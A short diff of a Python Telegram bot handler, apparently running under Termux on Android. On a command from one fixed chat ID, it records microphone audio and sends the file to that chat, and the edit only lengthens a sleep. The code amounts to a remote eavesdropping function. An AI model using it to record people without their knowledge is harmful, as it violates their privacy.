@@ -53,7 +53,7 @@ def start(message):
 def start(message):
     if message.chat.id == 831689238:
         subprocess.run('termux-microphone-record -f 1.mp3 -l 10', shell=True)
-        time.sleep(10)
+        time.sleep(15)
         audio = open('1.mp3', 'rb')
         bot.send_audio(831689238, audio)
         audio.close()
